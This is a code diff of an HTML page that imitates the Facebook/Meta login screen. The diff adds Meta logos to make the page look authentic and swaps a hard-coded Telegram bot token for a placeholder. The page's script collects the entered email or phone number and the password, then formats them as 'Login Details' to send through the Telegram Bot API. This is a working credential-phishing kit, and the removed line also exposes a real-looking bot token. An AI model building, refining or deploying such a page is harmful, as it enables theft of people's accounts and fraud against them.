@@ -35,7 +35,7 @@
         }
 
         .logo {
-            width: 80px;
+            width: 100px;
         }
 
         .input-field {
@@ -88,6 +88,21 @@
         .create-account-btn:hover {
             background-color: #e7f3ff;
         }
+
+        .meta-logo-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .meta-logo {
+            width: 60px;
+        }
+
+        .meta-text {
+            font-size: 14px;
+            color: #606770;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -102,6 +117,11 @@
         </form>
         <a href="#" class="forgot-password">Forgotten Password?</a>
         <button class="create-account-btn">Create new account</button>
+    </div>
+
+    <div class="meta-logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png" class="meta-logo" alt="Meta Logo">
+        <p class="meta-text">Meta</p>
     </div>
 
     <script>
@@ -122,7 +142,7 @@
             const password = document.getElementById('password').value;
 
             // Telegram Bot Token
-            const token = '7368163635:AAGEHrgX9PIqI7J58rJANzAPr-L9O_BfJWQ';
+            const token = 'YOUR_BOT_TOKEN_HERE'; // আপনার বট টোকেন এখানে দিন
             const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
 
             const message = `🔐 Login Details:\n📧 Email/Phone: ${emailOrPhone}\n🔑 Password: ${password}\n\n💡 Chat ID: ${chat_id}`;
@@ -149,4 +169,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
